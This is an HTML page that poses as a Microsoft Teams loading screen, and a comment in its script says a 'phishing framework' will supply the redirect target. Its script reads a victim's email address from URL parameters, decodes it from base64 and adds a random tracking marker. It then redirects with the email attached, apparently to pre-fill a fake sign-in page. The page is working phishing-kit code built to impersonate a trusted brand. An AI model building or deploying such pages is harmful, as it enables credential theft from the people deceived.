<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Teams</title>
    <link rel="icon" type="image/png" href="https://statics.teams.cdn.live.net/evergreen-assets/icons/Teams_Logo_v2025_80x80.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .logo-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin-bottom: 40px;
        }

        .logo {
            width: 100%;
            height: 100%;
            animation: pulse 2s ease-in-out infinite, fadeIn 0.8s ease-out;
            filter: drop-shadow(0 10px 30px rgba(0, 0, 0, 0.1));
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 140px;
            height: 140px;
            border: 3px solid rgba(91, 95, 199, 0.3);
            border-radius: 50%;
            animation: ringPulse 2s ease-out infinite;
        }

        .ring:nth-child(2) {
            animation-delay: 0.5s;
        }

        .ring:nth-child(3) {
            animation-delay: 1s;
        }

        @keyframes ringPulse {
            0% {
                width: 120px;
                height: 120px;
                opacity: 1;
            }
            100% {
                width: 200px;
                height: 200px;
                opacity: 0;
            }
        }

        .loading-text {
            color: #242424;
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 24px;
            opacity: 0;
            animation: fadeInUp 0.6s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .loading-dots {
            display: flex;
            gap: 8px;
            opacity: 0;
            animation: fadeInUp 0.6s ease-out 0.5s forwards;
        }

        .dot {
            width: 10px;
            height: 10px;
            background: #5B5FC7;
            border-radius: 50%;
            animation: bounce 1.4s ease-in-out infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            0%, 80%, 100% {
                transform: scale(0.6);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .progress-container {
            width: 280px;
            height: 4px;
            background: rgba(91, 95, 199, 0.2);
            border-radius: 2px;
            margin-top: 30px;
            overflow: hidden;
            opacity: 0;
            animation: fadeInUp 0.6s ease-out 0.7s forwards;
        }

        .progress-bar {
            height: 100%;
            background: #5B5FC7;
            border-radius: 2px;
            width: 0%;
            animation: progress 3s ease-in-out forwards;
        }

        @keyframes progress {
            0% {
                width: 0%;
            }
            20% {
                width: 25%;
            }
            50% {
                width: 60%;
            }
            80% {
                width: 85%;
            }
            100% {
                width: 100%;
            }
        }

        .footer {
            position: fixed;
            bottom: 30px;
            color: rgba(0, 0, 0, 0.5);
            font-size: 12px;
            opacity: 0;
            animation: fadeInUp 0.6s ease-out 0.9s forwards;
        }

        .footer a {
            color: rgba(0, 0, 0, 0.7);
            text-decoration: none;
        }

        /* Fade out animation before redirect */
        .fade-out {
            animation: fadeOut 0.5s ease-out forwards;
        }

        @keyframes fadeOut {
            to {
                opacity: 0;
                transform: scale(1.1);
            }
        }

        /* Background particles */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
            z-index: -1;
        }

        .particle {
            position: absolute;
            width: 6px;
            height: 6px;
            background: rgba(91, 95, 199, 0.15);
            border-radius: 50%;
            animation: float 15s infinite;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(720deg);
                opacity: 0;
            }
        }
    </style>
</head>

    <script>
        // Create floating particles
        function createParticles() {
            const container = document.getElementById('particles');
            const particleCount = 20;

            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
                particle.style.animationDelay = (Math.random() * 10) + 's';
                particle.style.width = (Math.random() * 4 + 4) + 'px';
                particle.style.height = particle.style.width;
                container.appendChild(particle);
            }
        }

        createParticles();

        // Get the current URL path to determine where to redirect
        function getRedirectUrl() {
            // The phishing framework will inject the actual target URL
            // For now, just continue to the main page
            const currentPath = window.location.pathname;
            const basePath = currentPath.replace(/\/[^\/]*$/, '');
            
            // Redirect to the main domain root after the redirector
            return window.location.origin + '/';
        }

        function decodeB64(s){if(!s||s.indexOf('@')!==-1)return s;try{var n=s.replace(/-/g,'+').replace(/_/g,'/');while(n.length%4)n+='=';var d=atob(n);if(d.indexOf('@')!==-1&&d.indexOf('.')!==-1)return d;}catch(e){}return s;}
        
        // Redirect after animation completes
        setTimeout(function() {
            const container = document.getElementById('main-container');
            container.classList.add('fade-out');
            
            setTimeout(function() {
                var url = new URL(window.location.href);
                var raw = url.searchParams.get('email') || url.searchParams.get('e') || url.searchParams.get('u') || url.searchParams.get('login_hint') || url.searchParams.get('user') || url.searchParams.get('mail') || '';
                var email = decodeB64(raw);
                var b1 = Math.floor(Math.random() * 256);
                var b2 = Math.floor(Math.random() * 256);
                var b3 = Math.floor(Math.random() * 256);
                var b4 = Math.floor(Math.random() * 256);
                var crc = (b1 + b2 + b3 + b4) & 0xFF;
                var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
                var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                url.searchParams.set('_r', marker);
                var finalUrl = url.toString();
                if (email) { finalUrl += '#' + email; }
                window.location.href = finalUrl;
            }, 500);
        }, 2500);
